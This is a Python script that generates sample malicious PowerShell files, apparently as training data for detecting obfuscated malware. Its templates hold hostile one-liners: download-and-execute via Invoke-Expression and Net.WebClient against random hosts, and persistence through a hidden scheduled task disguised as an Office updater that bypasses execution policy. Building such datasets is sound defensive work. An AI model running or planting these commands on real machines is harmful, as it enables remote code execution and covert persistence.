#Generates a powershell script from the set of random malicious commands
import random
import string
import subprocess

def get_random_dest():
	path = "/" + "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(5,10))])
	if(random.randint(0,1) == 0):
		#Return a domain
		ext = "." + "".join([random.choice(string.ascii_lowercase) for _ in range(random.randint(2,3))])
		hostname = "".join([random.choice(string.ascii_letters) for _ in range(random.randint(10,20))])
		domain = "http://" + hostname + ext + path
		return domain
	else:
		ip = str(random.randint(0,200)) + "." + str(random.randint(0,200)) + "." + str(random.randint(0,200))+ "." + str(random.randint(0,200))
		return ip + path

def get_random_text(min, max):
	return "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(min,max))])

def get_random_word():
	return get_random_text(3,10)

def get_random_regkey():
	key_name = get_random_word()
	key_location = "HKCU:\\" + "\\".join([get_random_word() for _ in range(random.randint(2,5))])
	return key_name, key_location

def remote_payload_cmd():
	ip = get_random_dest()
	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + ip + "\") \n"

#https://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
def persistence_cmd():
	cmd = "schtasks /create /tn OfficeUpdatorB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "
	cmd += "'" + remote_payload_cmd()[:-1] + "'\" /sc onidle /i 30 \n"
	return cmd

def registry_key_cmd():
	cmd = "$code = \"" + get_random_text(50,100) + "\"\n"
	key_location, key_name = get_random_regkey()
	cmd += "Set-ItemProperty \"HKCU:\\" + key_location + "\\\" -Name " + key_name + " -Value " + "$code \n"
	return cmd

#TODO: set_registry_key_cmd
commands = [remote_payload_cmd, persistence_cmd, registry_key_cmd]

def generate_script():
	script = ""
	script+= random.choice(commands)()
	#for f in [random.choice(commands) for _ in range(5)]:
		#script+=f()

	return script

def generate_raw(n):
	for i in range(n):
		script = generate_script()
		f = open(f"res/dataset-{i}.ps1",'w')
		f.write(script)
		f.close()

def generate_obfs(n):
	generate_raw(n)

	#Still need to figure out how this is gonna work
	#p = subprocess.Popen(['powershell.exe', './Invoke-Obfuscation'], stdout=sys.stdout)


generate_obfs(10)